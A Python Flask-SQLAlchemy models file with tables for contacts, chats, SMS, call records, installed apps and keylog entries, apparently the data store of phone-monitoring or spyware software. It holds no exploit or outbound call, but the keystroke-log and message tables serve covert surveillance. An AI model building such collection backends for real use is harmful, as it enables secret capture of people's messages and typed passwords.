from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

db = SQLAlchemy()

class Contacts(db.Model):
    """Contact information model for storing user contact details.
    
    Attributes:
        id (int): Primary key for the contact
        name (str): Name of the contact
        phone (str): Unique phone number with index for fast lookups
        created_at (datetime): Timestamp of when contact was created
    """
    __tablename__ = 'contacts'
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    phone = db.Column(db.String(20), unique=True, index=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

    def __repr__(self):
        return f'<Contact {self.name}>'

class Chat(db.Model):
    """Chat message model for storing messenger conversations.
    
    Attributes:
        id (int): Primary key for the message
        contact_id (int): Foreign key reference to contacts table
        message (str): Content of the chat message
        timestamp (datetime): When the message was sent/received
        message_hash (str): Unique hash for deduplication
    """
    __tablename__ = 'chats'
    id = db.Column(db.Integer, primary_key=True)
    contact_id = db.Column(db.Integer, db.ForeignKey('contacts.id'), nullable=False)
    message = db.Column(db.Text, nullable=False)
    timestamp = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)
    message_hash = db.Column(db.String(64), unique=True, index=True)
    
    __table_args__ = (
        db.Index('idx_chat_contact_time', 'contact_id', 'timestamp'),
    )

    def __repr__(self):
        return f'<Chat {self.id}>'

class SMS(db.Model):
    """SMS message model for storing text messages.
    
    Attributes:
        id (int): Primary key for the message
        contact_id (int): Foreign key reference to contacts table
        message (str): Content of the SMS
        timestamp (datetime): When the message was sent/received
        message_hash (str): Unique hash for deduplication
    """
    __tablename__ = 'sms'
    id = db.Column(db.Integer, primary_key=True)
    contact_id = db.Column(db.Integer, db.ForeignKey('contacts.id'), nullable=False)
    message = db.Column(db.Text, nullable=False)
    timestamp = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)
    message_hash = db.Column(db.String(64), unique=True, index=True)
    
    __table_args__ = (
        db.Index('idx_sms_contact_time', 'contact_id', 'timestamp'),
    )

    def __repr__(self):
        return f'<SMS {self.id}>'

class Calls(db.Model):
    """Call records model for storing call history.
    
    Attributes:
        id (int): Primary key for the call record
        contact_id (int): Foreign key reference to contacts table
        duration (int): Duration of call in seconds
        timestamp (datetime): When the call occurred
        call_type (str): Type of call (e.g., incoming, outgoing)
    """
    __tablename__ = 'calls'
    id = db.Column(db.Integer, primary_key=True)
    contact_id = db.Column(db.Integer, db.ForeignKey('contacts.id'), nullable=False)
    duration = db.Column(db.Integer)
    timestamp = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)
    call_type = db.Column(db.String(20))
    
    __table_args__ = (
        db.Index('idx_calls_contact_time', 'contact_id', 'timestamp'),
        db.UniqueConstraint('contact_id', 'timestamp', name='uq_call_contact_time')
    )

    def __repr__(self):
        return f'<Call {self.id}>'

class InstalledApps(db.Model):
    """Installed applications model for tracking app installations.
    
    Attributes:
        id (int): Primary key for the app record
        app_name (str): Unique name of the installed application
        install_date (datetime): When the app was installed
    """
    __tablename__ = 'installed_apps'
    id = db.Column(db.Integer, primary_key=True)
    app_name = db.Column(db.String(100), unique=True, nullable=False)
    install_date = db.Column(db.DateTime, default=datetime.utcnow)
    
    __table_args__ = (
        db.Index('idx_app_name', 'app_name'),
    )

    def __repr__(self):
        return f'<App {self.app_name}>'

class Keylogs(db.Model):
    """Keylog entries model for storing keyboard input logs.
    
    Attributes:
        id (int): Primary key for the keylog entry
        timestamp (datetime): When the keylog was recorded
        text (str): The logged text content
        app_name (str): Name of the application where text was entered
        text_hash (str): Unique hash for deduplication
        message_hash (str): Additional hash for message deduplication
    """
    __tablename__ = 'keylogs'
    id = db.Column(db.Integer, primary_key=True)
    timestamp = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)
    text = db.Column(db.Text, nullable=False)
    app_name = db.Column(db.String(100))
    text_hash = db.Column(db.String(64), unique=True, index=True)
    message_hash = db.Column(db.String(64), unique=True, index=True)
    
    __table_args__ = (
        db.Index('idx_keylogs_time', 'timestamp'),
        db.Index('idx_keylogs_app', 'app_name')
    )

    def __repr__(self):
        return f'<Keylog {self.id}>'

def init_db(app):
    """Initialize database and create all tables.
    
    Args:
        app: Flask application instance
        
    Raises:
        Exception: If database initialization fails
    """
    try:
        db.init_app(app)
        with app.app_context():
            db.create_all()
        logger.info("Database initialized successfully")
    except Exception as e:
        logger.error(f"Error initializing database: {str(e)}")
        raise

def test_db_connection(app):
    """Test database connection by executing a simple query.
    
    Args:
        app: Flask application instance
        
    Returns:
        bool: True if connection successful, False otherwise
    """
    try:
        with app.app_context():
            db.session.execute(db.select(Contacts).limit(1))
            logger.info("Database connection test successful!")
            return True
    except Exception as e:
        logger.error(f"Database connection test failed: {str(e)}")
        return False
